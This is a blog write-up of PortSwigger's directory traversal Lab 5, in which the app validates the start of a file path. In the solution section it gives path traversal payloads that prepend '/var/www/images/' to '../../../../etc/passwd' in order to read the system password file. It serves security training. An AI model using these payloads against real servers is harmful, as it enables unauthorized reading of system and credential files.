---
layout: post
title:  "PortSwigger - Directory Traversal - Lab 5"
date:   2024-06-10 00:00
image:  /images/portswigger/WebSecurityAcademy.png
tags:   [directory-traversal]
categories: [PortSwigger]
---

# Lab 5 - Directory Traversal - File path traversal, validation of start of path
><b>Lab Objective:</b>
<br/><br/>
This lab contains a path traversal vulnerability in the display of product images.
The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.<br/><br/>
To solve the lab, retrieve the contents of the `/etc/passwd` file.
<br/>
<br/>
<b>Reference:</b>
<br/>
<a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path">Port Swigger - Lab 5</a>
<br/>
<a href="https://academy.ranakhalil.com/courses/1491236/lectures/44691844">Rana Khalil - Lab 5</a>
<br/>

### Solution
<hr/>

#### 1. Investigate client default request and notice `/var/www/images` is appended to each image request.

#### 2. Append our payload after `/var/www/images`

```
../../../../etc/passwd
/var/www/images/../../../../etc/passwd
```

![Directory Traversal - Lab 5 - Start of path](/images/portswigger/DirectoryTraversal/lab5/directory-traversal-lab5.png)

<hr/>